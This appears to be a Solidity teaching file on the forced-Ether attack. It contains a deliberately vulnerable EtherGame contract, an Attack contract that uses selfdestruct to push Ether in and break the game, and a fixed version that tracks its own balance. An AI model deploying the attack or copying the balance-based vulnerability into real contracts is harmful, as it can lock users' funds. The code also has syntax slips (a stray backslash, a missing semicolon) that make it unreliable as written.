//SDPX-License-Identifieer: MIT
pragma solidity ^0.8.24;


// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/

contract EtherGame {
	uint256 public targetAmount = 7 ether;
	address public winner;


	function deposit() public payable {
		require(msg.value == 1 ether, "you can only send 1 ether");

		uint256 balance = address(this).balance;
		require(balance <= targetAmount, "game is over");\

		if(balance == targetAmount){
			winner = msg.sender;
		}
	}

	function claimReward() public  {
		require(msg.sender == winner, "not winner");

		(bool sent,) = msg.sender.call{value: address(this).balance}("");
		require(sent, "failed to send ether");
	}
}

contract Attack {
	EtherGame etherGame;

	constructor (EtherGame _etherGame){
		etherGame = EtherGame(_etherGame);
	}

	function attack() public payable {
		address payable addr = payable(address(etherGame));
		selfdestruct(addr);
	}

}


//preventive techniques
// dont rely on address(this).balance

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract EtherGame {
	uint256 public targetAmount = 3 ether;
	uint256 public balance;
	address public winner;

	function deposit() public payable {
		require(msg.value == 1 ether, "you can only send 1 ehter");

		balance += msg.value;
		require(balance <= targetAmount, "Game is over");

		if(balance == targetAmount){
			winner = msg.sender;
		}
	}

	function claimReward() public {
		require(msg.sender == winner, "not winner");
		(bool sent,) = msg.sender.call{value:balance}("");
		require(sent,"failed to send ether")
	}
}